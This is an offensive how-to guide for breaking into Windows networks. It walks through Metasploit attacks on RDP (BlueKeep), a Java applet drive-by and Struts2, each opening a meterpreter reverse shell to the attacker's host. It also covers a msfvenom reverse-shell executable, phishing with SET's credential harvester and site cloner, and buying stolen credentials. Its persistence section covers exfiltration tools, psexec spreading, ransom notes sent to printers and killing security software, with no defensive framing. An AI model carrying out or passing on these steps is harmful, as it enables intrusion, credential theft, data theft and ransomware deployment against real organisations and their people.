### Exploiting Remote Desktop Protocol (RDP)

**Steps to exploit RDP to gain initial access to the target network:**

1. **Identify RDP services:**
   Use tools like `nmap` to scan for open RDP ports (default is 3389).
   ```bash
   nmap -p 3389 <target-ip>
   ```

2. **Enumerate RDP vulnerabilities:**
   Use tools like `rdpscan` to check for vulnerabilities.
   ```bash
   rdpscan --target <target-ip>
   ```

3. **Exploit RDP vulnerabilities:**
   Use Metasploit to exploit RDP vulnerabilities such as BlueKeep.
   ```bash
   msfconsole
   use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
   set RHOSTS <target-ip>
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <your-ip>
   run
   ```

### Drive-by Attack for Initial Access

**Steps to gain initial access through a drive-by attack:**

1. **Set up a malicious website:**
   Use `Metasploit` or `SET` to host a malicious payload.
   ```bash
   msfconsole
   use exploit/multi/browser/java_signed_applet
   set SRVHOST <your-ip>
   set URIPATH /
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <your-ip>
   run
   ```

2. **Redirect victim to the malicious site:**
   Use social engineering or other methods to lure the target to visit the malicious website.

3. **Gain access:**
   Once the victim visits the site, the payload will be executed and you will get a reverse shell.

### Phishing Campaign for Initial Access

**Steps to gain initial access through a phishing campaign:**

1. **Create a phishing email:**
   Use tools like `SET` to create and send phishing emails.
   ```bash
   setoolkit
   1) Social-Engineering Attacks
   2) Website Attack Vectors
   3) Credential Harvester Attack Method
   ```

2. **Host a fake login page:**
   Clone a legitimate website and host it using `SET`.
   ```bash
   setoolkit
   1) Social-Engineering Attacks
   2) Website Attack Vectors
   3) Site Cloner
   ```

3. **Send the phishing email:**
   Use `SET` or another email spoofing tool to send the phishing email to the target with a link to the fake login page.

4. **Harvest credentials:**
   When the target enters their credentials, capture them and use them to access the network.

### Unauthorized Use of Legitimate Accounts

**Steps to gain initial access using legitimate accounts:**

1. **Purchase or obtain credentials:**
   Buy credentials from hacking forums or obtain them via brute force attacks.

2. **Attempt login:**
   Use the credentials to log in to the target network.
   ```bash
   ssh user@<target-ip>
   ```

3. **Gain access:**
   If the credentials are valid, you will gain access to the network.

### Exploiting Publicly Accessible Applications

**Steps to exploit publicly accessible applications to gain initial access:**

1. **Identify public applications:**
   Use tools like `nmap` to identify publicly accessible applications.
   ```bash
   nmap -p- <target-ip>
   ```

2. **Enumerate vulnerabilities:**
   Use tools like `nikto`, `dirb`, or `gobuster` to enumerate vulnerabilities.
   ```bash
   nikto -h <target-ip>
   gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
   ```

3. **Exploit vulnerabilities:**
   Use Metasploit or other exploit frameworks to exploit the vulnerabilities.
   ```bash
   msfconsole
   use exploit/multi/http/struts2_content_type_ognl
   set RHOST <target-ip>
   set TARGETURI /example/struts2-showcase/
   set PAYLOAD java/meterpreter/reverse_tcp
   set LHOST <your-ip>
   run
   ```

### Tools for File Transfer and Execution on Windows

**Common tools for transferring and executing files on Windows:**

- **WinSCP:**
  ```bash
  winscp <user>@<target-ip>
  ```

- **Rclone:**
  ```bash
  rclone copy <source> <destination>
  ```

- **MEGA Ltd MegaSync:**
  ```bash
  megacopy --username <user> --password <password> --local <local-file> --remote <remote-path>
  ```

- **FileZilla:**
  ```bash
  filezilla <user>@<target-ip>
  ```

### Exploiting Windows Systems

**General exploitation steps for Windows systems:**

1. **Compile the payload:**
   Use tools like `msfvenom` to create executable payloads.
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o payload.exe
   ```

2. **Transfer the payload:**
   Use tools like `WinSCP`, `Rclone`, or `FileZilla` to transfer the payload to the target machine.

3. **Execute the payload:**
   Execute the payload using various methods such as social engineering, exploiting existing vulnerabilities, or using remote code execution techniques.

### Persistence and Lateral Movement

**Techniques for persistence and lateral movement:**

- **Using administrative shares:**
  ```bash
  psexec \\<target-ip> -u <admin-user> -p <admin-pass> -c payload.exe
  ```

- **Scanning the network for additional targets:**
  Use embedded port scanners to find SMB, WebDav, DFS shares, etc.

- **Printing ransom notes using network printers:**
  Use tools like `PRET` to exploit network printers.
  ```bash
  python pret.py <printer-ip>
  ```

- **Spreading via Group Policy Objects (GPO):**
  Modify GPOs to spread malicious payloads.

- **Changing file extensions, icons, and other settings:**
  Modify file extensions and icons to disguise malicious files.

- **Self-deleting and machine shutdown:**
  Configure the payload to delete itself after execution or to shut down the machine.

- **Running in safe mode to bypass security solutions:**
  Configure the payload to run in safe mode to bypass security solutions.

- **Shutting down processes, services, and security solutions:**
  Use tools like `taskkill` to shut down processes, services, and security solutions.
